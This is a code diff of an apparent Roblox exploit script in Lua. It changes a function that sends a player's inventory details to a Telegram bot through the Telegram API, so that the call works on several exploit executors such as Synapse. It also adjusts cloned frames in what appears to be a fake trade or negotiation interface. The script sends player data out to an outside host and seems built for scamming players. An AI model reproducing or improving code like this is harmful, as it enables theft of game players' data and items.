@@ -249,7 +249,9 @@ task.spawn(function()
 		end
 		local function SendInfoInvToTG()
 			local formattedMessage = formatInventoryMessage()
-			local response = request({
+			local requests = syn and syn.request or http and http.request or request
+			
+			local response = requests({
 				Url = "https://api.telegram.org/bot" .. token .. "/sendMessage",
 				Method = "POST",
 				Headers = {
@@ -478,15 +480,15 @@ local function NAJCPZK_fake_script()
 	MakePlayer.Activated:Connect(function()
 		if chosenPlayer then
 
-			
-			
+
+
 			local newClone = partFrame:Clone()
 			newClone.Parent = negotiationFrameHeader
 			newClone.Name = "ClonedPartneredFrame"
 			newClone.NameLabel.Text = chosenPlayer
 			partFrame.Visible = false
-			
-			
+
+
 			local newclone2 = part2Frame:Clone()
 			newclone2.Parent = confrirmHeader
 			newclone2.Name = "ClonedPartneredFrame"
@@ -500,7 +502,7 @@ local function NAJCPZK_fake_script()
 		if existingClone then
 			existingClone:Destroy()
 		end
-		
+
 		local existingClone2 = confrirmHeader:FindFirstChild("ClonedPartneredFrame")
 		if existingClone2 then
 			existingClone2:Destroy()
